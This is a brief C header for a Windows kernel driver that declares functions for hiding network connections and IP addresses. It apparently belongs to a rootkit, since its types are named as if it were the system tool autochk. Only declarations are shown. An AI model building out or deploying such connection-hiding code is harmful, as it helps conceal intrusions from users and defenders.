#pragma once
#include <ntifs.h>
#include "Ioctl.h"

NTSTATUS NetInitializeConnectionHider();

VOID NetAddHiddenConnection(PAUTOCHK_HIDDEN_CONNECTION NewConnection);

VOID NetFreeConnectionHider();

BOOLEAN NetIsHiddenIpAddress(ULONG IpAddress);